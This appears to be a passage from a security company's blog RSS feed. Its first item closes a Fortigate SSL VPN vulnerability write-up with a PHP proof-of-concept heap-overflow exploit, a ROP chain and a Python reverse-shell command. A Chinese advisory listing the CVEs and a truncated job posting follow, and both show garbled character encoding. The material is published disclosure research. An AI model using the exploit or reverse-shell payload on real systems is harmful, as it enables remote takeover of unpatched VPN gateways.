              &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_start_async_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_do_handshake_intern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handshake_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;We overwrote the function table inside &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt;&lt;/a&gt; called &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087&quot;&gt;method&lt;/a&gt;, so when the program trying to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;s-&amp;gt;method-&amp;gt;ssl_renegotiate_check(s, 0);&lt;/code&gt;, it crashed.&lt;/p&gt;

    &lt;p&gt;This is actually an ideal target of our exploit! The allocation of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt; can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;ret = s-&amp;gt;handshake_func(s);&lt;/code&gt; calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.&lt;/p&gt;

    &lt;p&gt;We first &lt;strong&gt;spray&lt;/strong&gt; the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here we put our php PoC on an HTTP server:&lt;/p&gt;
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;II&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32FC078&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110FA1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110fa15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1bed1f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// pop rax ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x04410f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// add rdi, rax ; mov eax, dword [rdi] ; ret  ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1366639&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// call system ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;python -c &#39;import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);&#39; xx.xxx.xx.xx /bin/sh;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;AAAAAAAA&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// offset&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:void(0);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;The PoC can be divided into three parts.&lt;/p&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Fake SSL structure&lt;br /&gt;
 The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the &lt;code class=&quot;highlighter-rouge&quot;&gt;method&lt;/code&gt; to a place containing a void function pointer. The parameter at this time is SSL structure itself &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt;. However, there is only 8 bytes ahead of &lt;code class=&quot;highlighter-rouge&quot;&gt;method&lt;/code&gt;. We cannot simply call &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt; on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;p&gt;So we set the &lt;code class=&quot;highlighter-rouge&quot;&gt;handshake_func&lt;/code&gt; to this gadget, move the &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to our SSL structure, and do further ROP attack.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;ROP chain&lt;br /&gt;
 The ROP chain here is simple. We slightly move the &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; forward so there is enough space for our reverse shell command.&lt;/li&gt;
      &lt;li&gt;Overflow string&lt;br /&gt;
 Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.&lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt;Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the &lt;code class=&quot;highlighter-rouge&quot;&gt;SSL_do_handshake&lt;/code&gt;. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;demo&quot;&gt;Demo&lt;/h1&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Aw55HqZW4x0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;11 December, 2018 Reported to Fortinet&lt;/li&gt;
  &lt;li&gt;19 March, 2019 All fix scheduled&lt;/li&gt;
  &lt;li&gt;24 May, 2019 All advisory released&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
&lt;p&gt;Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/</link>
                <guid>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Fortigate SSL VPN è³‡å®‰é€šå ±</title>
                <description>&lt;h3 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h3&gt;

&lt;p&gt;ä¸Šä¸€ç¯‡ SSL VPN ç ”ç©¶ç³»åˆ—æ–‡æˆ‘å€‘é€šå ±äº†åœ¨ &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect ä¸Šçš„ RCE å¼±é»&lt;/a&gt;ï¼Œé€™ä¸€ç¯‡å°‡å…¬é–‹æˆ‘å€‘åœ¨ Fortigate SSL VPN ä¸Šçš„ç ”ç©¶ï¼Œå…±è¨ˆæ‰¾åˆ°ä¸‹åˆ—äº”å€‹å¼±é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2018-13379: Pre-auth arbitrary file reading&lt;/li&gt;
  &lt;li&gt;CVE-2018-13380: Pre-auth XSS&lt;/li&gt;
  &lt;li&gt;CVE-2018-13381: Pre-auth heap overflow&lt;/li&gt;
  &lt;li&gt;CVE-2018-13382: The magic backdoor&lt;/li&gt;
  &lt;li&gt;CVE-2018-13383: Post-auth heap overflow&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€éä¸éœ€èªè­‰çš„ä»»æ„è®€æª”å•é¡Œ(CVE-2018-13379)åŠ ä¸Šç®¡ç†ä»‹é¢ä¸Šçš„ heap overflow(CVE-2018-13383)ï¼Œæƒ¡æ„ä½¿ç”¨è€…å¯ç›´æ¥å–å¾— SSL VPN çš„æœ€é«˜æ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;æ­¤å¤–ï¼Œæˆ‘å€‘ä¹Ÿç™¼ç¾äº†ä¸€å€‹å®˜æ–¹å¾Œé–€(CVE-2018-13382)ï¼Œå¯ä»¥ä»»æ„ä¿®æ”¹ä½¿ç”¨è€…å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨å›å ± Fortigate å¾Œï¼Œå®˜æ–¹å·²é™¸çºŒä¿®å¾©é€™äº›å¼±é»ï¼Œå»ºè­° Fortigate SSL VPN çš„ç”¨æˆ¶æ›´æ–°è‡³æœ€æ–°ç‰ˆã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;é€™ç³»åˆ— VPN ç ”ç©¶ä¹Ÿå¾—åˆ°äº†ä»Šå¹´ BlackHat 2019 Pwnie Awards çš„ &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;pwnie for best server-side bug&lt;/a&gt;ï¼ˆå¹´åº¦æœ€ä½³ä¼ºæœå™¨æ¼æ´ï¼‰ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[å·²çµæŸ] DEVCORE å¾µæ±‚è¡Œæ”¿å°ˆå“¡</title>
                <description>&lt;p&gt;æˆ´å¤«å¯‡çˆ¾å³å°‡æ»¿ä¸ƒå¹´äº†ï¼Œéå»æˆ‘å€‘ä¸æ–·åœ°é‘½ç ”é€²éšæ”»æ“ŠæŠ€å·§ï¼Œç‚ºè¨±å¤šå®¢æˆ¶æä¾›é«˜å“è³ªçš„æ»²é€æ¸¬è©¦æœå‹™ï¼Œä¹Ÿæˆç‚ºå®¢æˆ¶æœ€ä¿¡è³´çš„è³‡å®‰ä¼™ä¼´ä¹‹ä¸€ã€‚åœ¨ 2017 å¹´æˆ‘å€‘æ›´æˆç‚ºç¬¬ä¸€å€‹åœ¨å°ç£æ¨å‡ºç´…éšŠæ¼”ç·´æœå‹™çš„æœ¬åœŸå» å•†ï¼Œé€éç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„é§­å®¢æ€ç¶­ï¼Œé™¸çºŒç‚ºé›»å­å•†å‹™ã€æ”¿åºœéƒ¨é–€ã€é‡‘èæ¥­è€…åŸ·è¡Œæœ€çœŸå¯¦ä¸”å…¨é¢çš„æ”»æ“Šæ¼”ç·´ï¼ŒåŒæ™‚ä¹Ÿç´¯ç©äº†è±å¯Œçš„ç¶“é©—èˆ‡æ¡ˆä¾‹ï¼Œæˆç‚ºå°ç£ç´…éšŠæ¼”ç·´å¯¦åŠ›æœ€æ·±åšçš„æœå‹™ä¾›æ‡‰å•†ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ 2015 å¹´æˆ‘å€‘æ›¾ç¶“å…¬é–‹å¾µæ±‚ä¸€ä½è¡Œæ”¿å‡ºç´äººæ‰ï¼Œå¾Œä¾†ç¶“éå±¤å±¤çš„å±¥æ­·å¯©æ ¸ã€ç­†è©¦ã€é¢è©¦ï¼Œçµ‚æ–¼é †åˆ©æ‰¾åˆ°ä¸€ä½ç¶“é©—è±å¯Œä¸”å€¼å¾—ä¿¡è³´çš„ç”Ÿæ´»é§­å®¢ï¼Œæˆç‚ºæˆ‘å€‘æœ€å¼·è€Œæœ‰åŠ›çš„å¾Œå‹¤ä¼™ä¼´ã€‚ä½†æ˜¯éš¨è‘—åœ˜éšŠäººæ•¸å¢é•·ã€æ¥­å‹™è¦æ¨¡å¤§å¹…å¢åŠ ã€äº‹å‹™åˆ†å·¥å°ˆæ¥­åŒ–ï¼Œè¡Œæ”¿éƒ¨é–€çš„çœ¾å¤šå·¥ä½œå·²ç¶“ç„¡æ³•ç”±å–®ä¸€äººåŠ›ç¨è‡ªè² è·ã€‚&lt;/p&gt;

&lt;p&gt;å› æ­¤ä»Šå¹´æˆ‘å€‘å†åº¦å…¬é–‹æ‹›å‹Ÿè¡Œæ”¿äººæ‰ï¼Œå¸Œæœ›èƒ½å¤ æ‰¾åˆ°ä¸€ä½è¡Œæ”¿å°ˆå“¡ï¼Œæ“´å¤§æˆ‘å€‘çš„å¾Œå‹¤èƒ½é‡ï¼Œéå›ºæˆ´å¤«å¯‡çˆ¾çš„åœ˜éšŠä½œæˆ°èƒ½åŠ›ï¼Œè®“æˆ‘å€‘æŒçºŒç‚ºä¼æ¥­æä¾›æœ€å„ªç•°çš„è³‡å®‰æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘éå¸¸æ¸´æœ›æ‚¨çš„åŠ å…¥ï¼Œè‹¥æ‚¨æœ‰æ„æˆç‚ºæˆ´å¤«å¯‡çˆ¾çš„ä¸€å“¡ï¼Œå¯åƒè€ƒä¸‹åˆ—è·ç¼ºç´°ç¯€ï¼š&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å·¥ä½œå…§å®¹&quot;&gt;å·¥ä½œå…§å®¹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;åº¶å‹™æ€§è¡Œæ”¿å·¥ä½œ 50%
    &lt;ul&gt;
      &lt;li&gt;äººå“¡æ¥å¾…ï¼Œä¾‹å¦‚ï¼šé›»è©±æ¥è½ã€ä¾†è¨ªäººå“¡æ¥å¾…&lt;/li&gt;
      &lt;li&gt;æ–‡ä»¶æ”¶ç™¼ï¼Œä¾‹å¦‚ï¼šéƒµå‹™ä½œæ¥­ã€å¿«éæœå‹™&lt;/li&gt;
      &lt;li&gt;æª”æ¡ˆç®¡ç†ï¼Œä¾‹å¦‚ï¼šåç‰‡æƒæã€åˆç´„æƒæã€ç¯„æœ¬æª”æ¡ˆæ ¼å¼èª¿æ•´&lt;/li&gt;
      &lt;li&gt;è³‡æ–™è’é›†ï¼Œä¾‹å¦‚ï¼šå„é¡å…¬å¸æ¥­å‹™éœ€æ±‚è³‡æ–™æŸ¥æ‰¾&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç¸½å‹™å·¥ä½œ 20%
    &lt;ul&gt;
      &lt;li&gt;è¾¦å…¬å®¤å„é¡ç”¨å“æ¡è²·&lt;/li&gt;
      &lt;li&gt;è¾¦å…¬å®¤ç’°å¢ƒç¶­è­·&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ¡è³¼å·¥ä½œ 15%
    &lt;ul&gt;
      &lt;li&gt;è¨­å‚™æ¡è³¼ç®¡ç†&lt;/li&gt;
      &lt;li&gt;æœå‹™ä¾›æ‡‰å•†ç®¡ç†&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;äººäº‹å·¥ä½œ 5%
    &lt;ul&gt;
      &lt;li&gt;ä¿éšªäº‹å‹™ï¼Œä¾‹å¦‚ï¼šåœ˜é«”ä¿éšªã€æ—…éŠä¸ä¾¿éšª&lt;/li&gt;
      &lt;li&gt;å·®æ—…è¡Œç¨‹ï¼Œä¾‹å¦‚ï¼šäº¤é€šç¥¨åˆ¸è¨‚è³¼ã€ç°½è­‰è¾¦ç†&lt;/li&gt;
      &lt;li&gt;æ•™è‚²è¨“ç·´å®‰æ’&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…¶ä»–ä¸»ç®¡äº¤è¾¦äº‹é … 10%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ™‚é–“&quot;&gt;å·¥ä½œæ™‚é–“&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œåœ°é»&quot;&gt;å·¥ä½œåœ°é»&lt;/h3&gt;
&lt;p&gt;å°åŒ—å¸‚ä¸­å±±å€å¾©èˆˆåŒ—è·¯ 168 è™Ÿ 10 æ¨“&lt;br /&gt;
ï¼ˆæ·é‹å—äº¬å¾©èˆˆç«™ 8 è™Ÿå‡ºå£ï¼Œèµ°è·¯ç´„ 3 åˆ†é˜ï¼‰&lt;/p&gt;

&lt;h3 id=&quot;äººæ ¼ç‰¹è³ªåå¥½&quot;&gt;äººæ ¼ç‰¹è³ªåå¥½&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ç´°å¿ƒåš´è¬¹ï¼Œèƒ½è€å¿ƒçš„è™•ç†ç¹ç‘£çš„åº¶å‹™å·¥ä½œã€‚&lt;/li&gt;
  &lt;li&gt;ä¸»å‹•ç©æ¥µï¼Œçœ‹åˆ°æˆ‘å€‘æ²’ç™¼ç¾çš„ç´°ç¯€ï¼Œè¶…è¶Šæˆ‘å€‘æ‰€æœŸæœ›çš„åŸºæº–ã€‚&lt;/li&gt;
